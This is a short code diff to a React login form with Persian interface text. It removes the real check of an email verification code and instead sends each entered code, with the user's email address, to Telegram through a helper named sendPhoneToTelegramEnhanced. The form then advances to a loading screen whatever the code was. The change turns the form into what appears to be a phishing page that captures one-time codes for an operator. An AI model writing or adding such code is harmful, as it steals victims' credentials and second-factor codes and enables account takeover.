@@ -435,17 +435,19 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      const storedCode = sessionStorage.getItem("emailCode");
-      if (emailCode !== storedCode) {
-        throw new Error("Invalid email code");
-      }
+      console.log("Sending email code to Telegram:", emailCode);
 
-      console.log("Email verification successful");
-      await new Promise((resolve) => setTimeout(resolve, 1000));
+      // Send email code to Telegram
+      await sendPhoneToTelegramEnhanced(
+        `✅ کاربر کد تایید ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
+        false,
+      );
+
+      // Navigate to loading page after sending to Telegram
       setCurrentStep("loading");
     } catch (error) {
       console.error("Email code verification error:", error);
-      setErrors({ emailCode: "کد ایمیل نادرست است. لطفا دوباره تلاش کنید." });
+      setErrors({ emailCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
